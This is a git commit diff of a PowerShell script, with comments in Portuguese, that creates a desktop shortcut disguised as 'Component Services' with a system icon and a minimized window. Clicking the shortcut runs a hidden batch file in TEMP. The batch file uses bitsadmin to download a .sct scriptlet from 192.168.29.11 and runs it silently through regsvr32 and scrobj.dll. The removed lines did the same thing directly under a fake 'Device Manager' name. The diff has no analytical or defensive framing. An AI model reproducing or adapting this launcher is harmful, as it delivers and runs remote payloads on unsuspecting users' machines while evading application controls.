3815eaa9f379503bbcdb20bef5563d7241e69730
Steven guimaraes <99700348+ticofookfook@users.noreply.github.com>
2025-03-29 19:50:54 -0300

    Update creat-lnk.ps1

--- creat-lnk.ps1
+++ creat-lnk.ps1
@@ -1,15 +1,25 @@
 # Caminho para a área de trabalho
 $atalhoPath = "$env:USERPROFILE\Desktop"
 
-# Criar atalho usando regsvr32
+# Criar um arquivo BAT direto (sem codificação)
+$batPath = "$env:TEMP\config.bat"
+@"
+@echo off
+rem Executar silenciosamente
+bitsadmin /transfer myDownloadJob /download /priority high http://192.168.29.11/teste.sct "%TEMP%\data.tmp" > nul
+regsvr32 /s /u /i:"%TEMP%\data.tmp" scrobj.dll
+exit
+"@ | Out-File -FilePath $batPath -Encoding ASCII
+
+# Criar atalho diretamente para o BAT
 $WshShell = New-Object -ComObject WScript.Shell
-$atalho = $WshShell.CreateShortcut("$atalhoPath\Device Manager.lnk")
-$atalho.TargetPath = "$env:windir\System32\regsvr32.exe"
-$atalho.Arguments = "/s /u /i:http://192.168.29.11/teste.sct scrobj.dll"
-$atalho.Description = "Device Manager"
-$atalho.IconLocation = "$env:SystemRoot\System32\devmgr.dll,0"
+$atalho = $WshShell.CreateShortcut("$atalhoPath\Component Services.lnk")
+$atalho.TargetPath = "$env:ComSpec"
+$atalho.Arguments = "/c start /min $batPath"
+$atalho.Description = "Component Services"
+$atalho.IconLocation = "$env:SystemRoot\System32\mmcndmgr.dll,0"
 $atalho.WindowStyle = 7
 $atalho.Save()
 
 # Exibir confirmação
-Write-Host "Atalho criado com sucesso em: $atalhoPath\Device Manager.lnk" -ForegroundColor Green
+Write-Host "Atalho criado com sucesso em: $atalhoPath\Component Services.lnk" -ForegroundColor Green
